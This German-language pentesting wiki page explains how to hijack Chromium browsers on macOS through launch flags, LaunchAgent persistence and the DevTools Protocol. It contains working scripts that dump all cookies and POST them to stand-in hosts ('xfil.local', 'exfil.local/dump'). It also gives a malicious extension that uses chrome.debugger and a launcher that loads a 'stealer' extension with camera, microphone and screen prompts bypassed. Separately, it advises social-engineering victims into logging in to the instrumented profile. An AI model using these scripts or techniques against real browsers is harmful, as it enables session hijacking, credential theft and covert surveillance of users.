# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Grundlegende Informationen

Chromium-basierte Browser wie Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi und Opera nutzen alle dieselben command-line switches, preference files und DevTools-Automation-Interfaces. Unter macOS kann jeder Nutzer mit GUI-Zugriff eine bestehende Browsersitzung beenden und sie mit beliebigen flags, extensions oder DevTools-Endpunkten neu öffnen, die mit den entitlements des Ziels ausgeführt werden.

#### Launching Chromium with custom flags on macOS

macOS hält eine einzelne UI-Instanz pro Chromium-Profil, daher erfordert Instrumentierung normalerweise das erzwungene Schließen des Browsers (zum Beispiel mit `osascript -e 'tell application "Google Chrome" to quit'`). Angreifer starten typischerweise neu via `open -na "Google Chrome" --args <flags>`, um Argumente zu injizieren, ohne das App-Bundle zu ändern. Das Einbetten dieses Befehls in einen user LaunchAgent (`~/Library/LaunchAgents/*.plist`) oder einen login hook garantiert, dass der manipulierte Browser nach Reboot/Abmeldung wieder gestartet wird.

#### `--load-extension` Flag

Das `--load-extension`-Flag lädt unpacked extensions automatisch (kommagetrennte Pfade). Kombiniere es mit `--disable-extensions-except`, um legitime extensions zu blockieren und nur deine Payload auszuführen. Malicious extensions können hochwirksame permissions wie `debugger`, `webRequest` und `cookies` anfordern, um in DevTools-Protokolle zu pivotieren, CSP-Header zu patchen, HTTPS herabzustufen oder Session-Material zu exfiltrieren, sobald der Browser startet.

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags

Diese Switches exponieren das Chrome DevTools Protocol (CDP) über TCP oder eine Pipe, sodass externe Tools den Browser steuern können. Google beobachtete weitverbreiteten Infostealer-Missbrauch dieser Schnittstelle und ab Chrome 136 (März 2025) werden die Switches für das default profile ignoriert, sofern der Browser nicht mit einem non-standard `--user-data-dir` gestartet wird. Das erzwingt App-Bound Encryption bei realen Profilen, aber Angreifer können weiterhin ein frisches Profil erzeugen, das Opfer zur Authentifizierung darin zwingen (Phishing/triage assistance) und via CDP Cookies, Tokens, device trust states oder WebAuthn-Registrierungen ernten.

#### `--user-data-dir` Flag

Dieses Flag leitet das gesamte Browser-Profil (History, Cookies, Login Data, Preference files, etc.) auf einen vom Angreifer kontrollierten Pfad um. Es ist zwingend erforderlich, wenn moderne Chrome-Builds mit `--remote-debugging-port` kombiniert werden, und es hält das manipulierte Profil isoliert, sodass man vorgefüllte `Preferences` oder `Secure Preferences`-Dateien ablegen kann, die Sicherheitsabfragen deaktivieren, Extensions automatisch installieren und default schemes ändern.

#### `--use-fake-ui-for-media-stream` Flag

Dieser Switch umgeht die Kamera-/Mikrofon-Berechtigungsabfrage, sodass jede Seite, die `getUserMedia` aufruft, sofort Zugriff erhält. Kombiniere ihn mit Flags wie `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk` oder CDP-Commands wie `Browser.grantPermissions`, um Audio/Video still zu erfassen, Desk-Sharing durchzuführen oder WebRTC-Berechtigungsprüfungen ohne Benutzerinteraktion zu erfüllen.

## Remote Debugging & Missbrauch des DevTools-Protokolls

Sobald Chrome mit einem dedizierten `--user-data-dir` und `--remote-debugging-port` neu gestartet ist, kann man sich über CDP verbinden (z. B. via `chrome-remote-interface`, `puppeteer` oder `playwright`) und hochprivilegierte Workflows skripten:

- **Cookie/session theft:** `Network.getAllCookies` und `Storage.getCookies` geben HttpOnly-Werte zurück, selbst wenn App-Bound Encryption normalerweise den Dateisystemzugriff blockieren würde, weil CDP den laufenden Browser bittet, sie zu entschlüsseln.
- **Permission tampering:** `Browser.grantPermissions` und `Emulation.setGeolocationOverride` erlauben das Umgehen von Kamera/Mikrofon-Abfragen (insbesondere kombiniert mit `--use-fake-ui-for-media-stream`) oder das Fälschen standortbasierter Sicherheitsprüfungen.
- **Keystroke/script injection:** `Runtime.evaluate` führt beliebiges JavaScript im aktiven Tab aus, was das Auslesen von Anmeldeinformationen, DOM-Patching oder das Injizieren von Persistence-Beacons ermöglicht, die Navigation überdauern.
- **Live exfiltration:** `Network.webRequestWillBeSentExtraInfo` und `Fetch.enable` fangen authentifizierte Requests/Responses in Echtzeit ab, ohne Disk-Artefakte zu erzeugen.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Weil Chrome 136 CDP im Standardprofil blockiert, liefert das Kopieren/Einfügen des vorhandenen Verzeichnisses des Opfers `~/Library/Application Support/Google/Chrome` in einen Staging-Pfad nicht mehr entschlüsselte cookies. Stattdessen social-engineer den Benutzer dazu, sich innerhalb des instrumentierten Profils zu authentifizieren (z. B. eine „hilfreiche“ Support-Sitzung), oder fange MFA-Token unterwegs über CDP-controlled network hooks ab.

## Extension-Based Injection via Debugger API

Die Forschung 2023 "Chrowned by an Extension" zeigte, dass eine bösartige Extension, die die `chrome.debugger` API verwendet, sich an jeden Tab anhängen kann und dieselben DevTools-Befugnisse wie `--remote-debugging-port` erhält. Das bricht die ursprünglichen Isolationsannahmen (extensions bleiben in ihrem Kontext) und ermöglicht:

- Stiller Diebstahl von cookies und Zugangsdaten mittels `Network.getAllCookies`/`Fetch.getResponseBody`.
- Änderung von Site-Berechtigungen (camera, microphone, geolocation) und Umgehung von security interstitials, sodass Phishing-Seiten Chrome-Dialoge imitieren können.
- On-path-Manipulation von TLS-Warnungen, Downloads oder WebAuthn-Aufforderungen durch programmgesteuerte Steuerung von `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` oder `Security.handleCertificateError`.

Lade die Extension mit `--load-extension`/`--disable-extensions-except`, sodass keine Benutzerinteraktion erforderlich ist. Ein minimales Background-Skript, das die API missbraucht, sieht folgendermaßen aus:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
Die Extension kann sich auch auf `Debugger.paused`-Ereignisse abonnieren, um JavaScript-Variablen auszulesen, Inline-Skripte zu patchen oder eigene Breakpoints zu setzen, die Navigationen überdauern. Da alles innerhalb der GUI-Session des Benutzers läuft, werden Gatekeeper und TCC nicht ausgelöst, was diese Technik ideal für Malware macht, die bereits im Benutzerkontext ausgeführt wird.

### Tools

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Automatisiert Chromium-Starts mit payload-Erweiterungen und stellt interaktive CDP-Hooks zur Verfügung.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Ähnliche Tools, die sich auf Traffic-Interception und Browser-Instrumentation für macOS-Operatoren konzentrieren.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Node.js-Bibliothek, um Chrome DevTools Protocol-Dumps (cookies, DOM, permissions) zu skripten, sobald eine Instanz mit `--remote-debugging-port` läuft.

### Example
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Weitere Beispiele finden Sie in den Links zu Tools.

## Referenzen

- [https://twitter.com/RonMasas/status/1758106347222995007](https://twitter.com/RonMasas/status/1758106347222995007)
- [https://developer.chrome.com/blog/remote-debugging-port](https://developer.chrome.com/blog/remote-debugging-port)
- [https://arxiv.org/abs/2305.11506](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
